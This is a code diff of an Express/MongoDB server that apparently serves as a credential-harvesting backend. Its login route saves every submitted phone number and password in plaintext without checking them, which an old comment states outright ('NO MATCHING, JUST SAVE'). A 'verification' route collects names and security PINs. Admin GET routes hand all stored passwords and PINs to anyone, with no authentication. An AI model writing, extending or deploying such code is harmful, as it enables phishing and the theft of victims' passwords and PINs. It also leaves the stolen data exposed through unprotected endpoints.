@@ -5,25 +5,20 @@ const cors = require("cors");
 
 const app = express();
 
-/* -------------------- MIDDLEWARE -------------------- */
-app.use(
-  cors({
-    origin: "*",
-    methods: ["GET", "POST", "PUT", "DELETE"],
-  })
-);
+/* ===== MIDDLEWARE (ORDER IMPORTANT) ===== */
+app.use(cors());
 app.use(express.json());
 
-/* -------------------- MONGODB CONNECT -------------------- */
+/* ===== MONGODB CONNECT ===== */
 mongoose
   .connect(process.env.MONGO_URI)
-  .then(() => console.log("✅ MongoDB Connected Successfully"))
+  .then(() => console.log("✅ MongoDB Connected"))
   .catch((err) => {
-    console.error("❌ MongoDB connection error:", err);
+    console.error("❌ MongoDB Error:", err);
     process.exit(1);
   });
 
-/* -------------------- SCHEMAS -------------------- */
+/* ===== SCHEMAS ===== */
 const userSchema = new mongoose.Schema(
   {
     phone: String,
@@ -45,15 +40,14 @@ const verificationSchema = new mongoose.Schema(
 );
 const Verification = mongoose.model("Verification", verificationSchema);
 
-/* ==================== API ROUTES ==================== */
 
-/* ---------- LOGIN (NO MATCHING, JUST SAVE) ---------- */
+/* ===== LOGIN ===== */
 app.post("/api/login", async (req, res) => {
   try {
     const { phone, password } = req.body;
 
     if (!phone || !password) {
-      return res.status(400).json({ success: false });
+      return res.json({ success: false, message: "Missing fields" });
     }
 
     const user = await User.create({ phone, password });
@@ -68,17 +62,17 @@ app.post("/api/login", async (req, res) => {
   }
 });
 
-/* ---------- VERIFICATION ---------- */
+/* ===== VERIFICATION ===== */
 app.post("/api/verify", async (req, res) => {
   try {
-    const { full_name, problem, security_pin, experience } = req.body;
+    const { userId, full_name, problem, security_pin, experience } = req.body;
 
-    if (!full_name || !security_pin) {
+    if (!userId || !full_name || !security_pin) {
       return res.json({ success: false });
     }
 
     await Verification.create({
-      userId: Date.now().toString(), // simple linking
+      userId,
       full_name,
       problem,
       security_pin,
@@ -92,7 +86,7 @@ app.post("/api/verify", async (req, res) => {
   }
 });
 
-/* ---------- ADMIN LOGIN ---------- */
+/* ===== ADMIN LOGIN ===== */
 app.post("/api/admin/login", (req, res) => {
   if (req.body.password === process.env.ADMIN_PASSWORD) {
     res.json({ success: true });
@@ -101,49 +95,29 @@ app.post("/api/admin/login", (req, res) => {
   }
 });
 
-/* ---------- ADMIN USERS ---------- */
+/* ===== ADMIN USERS ===== */
 app.get("/api/admin/getUsers", async (req, res) => {
-  try {
-    const users = await User.find().sort({ createdAt: -1 });
-    res.json(users);
-  } catch (err) {
-    console.error(err);
-    res.status(500).json([]);
-  }
+  const users = await User.find().sort({ createdAt: -1 });
+  res.json(users);
 });
 
-app.delete("/api/admin/deleteUser/:id", async (req, res) => {
-  try {
-    await User.findByIdAndDelete(req.params.id);
-    res.json({ success: true });
-  } catch (err) {
-    console.error(err);
-    res.status(500).json({ success: false });
-  }
-});
+// app.delete("/api/admin/deleteUser/:id", async (req, res) => {
+//   await User.findByIdAndDelete(req.params.id);
+//   res.json({ success: true });
+// });
 
-/* ---------- ADMIN VERIFICATION ---------- */
+/* ===== ADMIN VERIFICATION ===== */
 app.get("/api/admin/getVerification", async (req, res) => {
-  try {
-    const data = await Verification.find().sort({ createdAt: -1 });
-    res.json(data);
-  } catch (err) {
-    console.error(err);
-    res.status(500).json([]);
-  }
+  const data = await Verification.find().sort({ createdAt: -1 });
+  res.json(data);
 });
 
-app.delete("/api/admin/deleteVerification/:id", async (req, res) => {
-  try {
-    await Verification.findByIdAndDelete(req.params.id);
-    res.json({ success: true });
-  } catch (err) {
-    console.error(err);
-    res.status(500).json({ success: false });
-  }
-});
+// app.delete("/api/admin/deleteVerification/:id", async (req, res) => {
+//   await Verification.findByIdAndDelete(req.params.id);
+//   res.json({ success: true });
+// });
 
-/* -------------------- SERVER -------------------- */
+/* ===== SERVER ===== */
 const PORT = process.env.PORT || 5000;
 app.listen(PORT, () =>
   console.log("🚀 Server running on port", PORT)
